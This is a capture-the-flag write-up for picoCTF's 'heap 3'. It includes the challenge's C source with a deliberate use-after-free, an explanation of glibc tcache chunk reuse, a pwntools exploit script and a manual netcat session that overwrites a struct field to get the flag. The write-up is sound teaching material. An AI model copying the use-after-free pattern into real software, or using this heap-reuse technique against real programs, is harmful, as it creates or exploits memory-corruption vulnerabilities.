# PicoCTF - heap 3

## Challenge Overview
**Title:** heap 3  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** chall.c, chall

## Description
This program mishandles memory. Can you exploit it to get the flag? Download the binary here. Download the source here. Connect with the challenge instance here: nc tethys.picoctf.net 53532

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}

void print_menu() {
    printf("\n1. Print Heap\n2. Allocate object\n3. Print x->flag\n4. Check for win\n5. Free x\n6. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

// Create a struct
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}

void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x->flag, x->flag);
    printf("+-------------+-----------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            alloc_object();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x->flag);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            free_memory();
            break;
        case 6:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}

```

## Analysis
Similarly to the previous challenges in the series, we have to override a value in the heap.  
This challenge is different however.  
As the program suggest when launched
```
$ ./chall

freed but still in use
now memory untracked
do you smell the bug?
```

We have to exploit a use-after-free vulnerability.

In the program we see the global pointer `x` to a struct.
```c
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;
...
object *x;
```

In the option menu presented, we have an option to free `x`
```
1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit
```

When we do that, the rest of the options are still available and reference the freed memory.  

So our goal is to allocate memory, using option 2, which will be the same as the one freed, write `pico` over the flag field of the struct and print it using option 3.  

But how can we control whether `malloc()` will use the same memory?  
Thanks to TCACHE, it is possible

### TCACHE
**TCACHE** or **Thread Local Cache** is a per thread cache implemented for optimization purposes.  
It stores some recently freed chunks of memory before sending them to the global memory free pool so that if the thread requests to allocate a chunk of the same size as one of the stored ones, it will serve that, avoiding the overhead of going further for the allocation.

In our case, if we allocate an object of the same size as `x`, the size of the struct, after freeing it,  then TCACHE should give us the same memory to write on.  
The struct has a total size of 35 bytes (3 character arrays of size 10 and one of 5)  
The flag field we want is the last 5 bytes so our payload will be a string of 30 random characters and `pico` at the end
`AAAAAAAAAABBBBBBBBBBCCCCCCCCCCpico`

To do this I have written the following **Python** script
### Python Script
```python
from pwn import *
import sys

def reverse_str(str):
    chunks = [str[i:i+2] for i in range(0, len(str), 2)]

    chunks.reverse()

    hex_bytes = ['\\x' + chunk for chunk in chunks]
    return ''.join(hex_bytes)


def construct_payload(dist, win_addr, encode=False):
    payload = "A" * dist
    payload+=reverse_str(win_addr)
    if encode:
        return payload.encode().decode('unicode_escape').encode('latin1')
    return payload

def send_to_server(conn: remote):
    conn.sendline(b'5')
    conn.sendline(b'2')
    conn.sendline(b'35')
    conn.sendline(b'AAAAAAAAAABBBBBBBBBBCCCCCCCCCCpico')
    conn.sendline(b'4')
    response=conn.recvall()
    conn.close()
    return response.decode('utf-8', errors='ignore')

def get_flag(output):
    index = output.find("picoCTF{")
    result = output[index:]  # substring from pattern to end
    return result


def remote_server():
    host = 'tethys.picoctf.net'
    port = 53532
    conn = remote(host, port)
    server_output = send_to_server(conn)
    print(get_flag(server_output))


def local():
    p=process("./chall")
    local_output = send_to_server(p)
    print(get_flag(local_output))

def main():
    if(len(sys.argv) <=1):
        print("Please enter operation")
        sys.exit()
    operation=sys.argv[1]
    
    if operation == "local":
        local()
    elif operation == "remote":
        remote_server()
    else:
        print("Invalid operation")
main()
```

It has two options, `local` and `remote`, to execute the exploit on either the local binary or the remote server
```
$ python script_3.py local
[+] Starting local process './chall': pid 11691
[+] Receiving all data: Done (459B)
[*] Process './chall' stopped with exit code 0 (pid 11691)
picoCTF{My_Flag}
```
Or it can be easily done manually like shown below

## Solution
- Free `x` using option 5
- Calculate size of struct which is 35
- Allocate a new object using option 2
- Enter size 35
- Enter 30 random characters followed by `pico` as data like `AAAAAAAAAABBBBBBBBBBCCCCCCCCCCpico`
- Check for win using option 4

### Execution Example
```
$ nc tethys.picoctf.net 53532

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 35
Data for flag: AAAAAAAAAABBBBBBBBBBCCCCCCCCCCpico

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 3


x = pico


1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 4
YOU WIN!!11!!
picoCTF{____RECACTED____}
```